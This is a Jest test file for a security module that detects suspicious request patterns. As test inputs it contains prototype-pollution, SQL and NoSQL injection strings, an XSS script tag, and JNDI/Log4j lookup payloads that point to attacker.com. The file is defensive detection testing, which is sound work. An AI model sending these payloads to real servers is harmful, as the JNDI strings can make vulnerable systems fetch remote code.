/**
 * Enhanced detection tests for suspicious request patterns
 * @module tests/security/enhanced-detection.test
 */

import { detectSuspiciousPatterns } from '@/lib/security/suspicious-patterns';

describe('Enhanced Suspicious Pattern Detection', () => {
  const createMockRequest = (
    url: string,
    headers: Record<string, string> = {}
  ) => {
    return new Request(new URL(url, 'https://example.com').toString(), {
      headers: new Headers(headers),
    });
  };

  describe('Query Parameter Key Scanning', () => {
    it('should detect suspicious patterns in query parameter keys', () => {
      // Prototype pollution in key
      const requestProto = createMockRequest(
        'https://example.com/api/test?__proto__=polluted'
      );
      const resultProto = detectSuspiciousPatterns(requestProto, { minSeverity: 3 });
      expect(resultProto.detected).toBe(true);
      expect(resultProto.patterns.some(p => p.category === 'prototype_pollution')).toBe(true);

      // SQL injection in key
      const requestSql = createMockRequest(
        'https://example.com/api/test?SELECT * FROM users=1'
      );
      const resultSql = detectSuspiciousPatterns(requestSql, { minSeverity: 3 });
      expect(resultSql.detected).toBe(true);
      expect(resultSql.patterns.some(p => p.category === 'sql_injection')).toBe(true);
    });
  });

  describe('NoSQL Bracket Notation Detection', () => {
    it('should detect NoSQL operator injection in bracket notation', () => {
      const operators = ['$ne', '$gt', '$exists', '$regex'];
      for (const op of operators) {
        const request = createMockRequest(
          `https://example.com/api/test?id[${op}]=1`
        );
        const result = detectSuspiciousPatterns(request, { minSeverity: 3 });
        expect(result.detected).toBe(true);
        expect(result.maxSeverity).toBe(3);
        expect(result.patterns.some(p => p.category === 'nosql_injection')).toBe(true);
      }
    });
  });

  describe('Expanded JNDI Pattern Detection', () => {
    it('should detect various JNDI/Log4j-style injection variations', () => {
      const variations = [
        '${jndi:ldap://attacker.com/a}',
        '${jndi:rmi://attacker.com/a}',
        '${jndi:dns://attacker.com/a}',
        '${jndi:nis://attacker.com/a}',
        '${jndi:jmx://attacker.com/a}',
        '${jndi:iiop://attacker.com/a}',
      ];
      for (const payload of variations) {
        const request = createMockRequest(
          `https://example.com/api/test?log=${payload}`
        );
        const result = detectSuspiciousPatterns(request, { minSeverity: 3 });
        expect(result.detected).toBe(true);
        expect(result.maxSeverity).toBe(3);
        expect(result.patterns.some(p => p.category === 'log_injection')).toBe(true);
      }
    });
  });

  describe('Header Key and Value Scanning', () => {
    it('should detect suspicious patterns in header keys and values', () => {
      // Suspicious header value
      const requestValue = createMockRequest('https://example.com/api/test', {
        'X-Custom-Header': '<script>alert(1)</script>'
      });
      const resultValue = detectSuspiciousPatterns(requestValue, { minSeverity: 3 });
      expect(resultValue.detected).toBe(true);
      expect(resultValue.patterns.some(p => p.category === 'xss')).toBe(true);

      // We use a manually created request object to test key scanning without Header validation
      // as standard Headers constructor validates that keys are valid HTTP tokens.
      const headersList: [string, string][] = [
        ['X-JNDI-Payload-${jndi:ldap://a}', 'value']
      ];

      const mockRequest = {
        url: 'https://example.com/api/test',
        method: 'GET',
        headers: {
          get: (name: string) => null,
          forEach: (cb: any) => headersList.forEach(([k, v]) => cb(v, k)),
          entries: () => headersList[Symbol.iterator]()
        }
      } as unknown as Request;

      const result = detectSuspiciousPatterns(mockRequest, { minSeverity: 3 });
      expect(result.detected).toBe(true);
      expect(result.patterns.some(p => p.category === 'log_injection')).toBe(true);
    });

    it('should skip scanning for specific sensitive headers', () => {
      // These should be skipped to avoid false positives or redundant scanning
      const request = createMockRequest('https://example.com/api/test', {
        'Cookie': 'session=__proto__',
        'Authorization': 'Bearer ${jndi:ldap://a}',
        'X-API-Key': 'sk_live_12345'
      });
      const result = detectSuspiciousPatterns(request, { minSeverity: 3 });
      expect(result.detected).toBe(false);
    });
  });
});
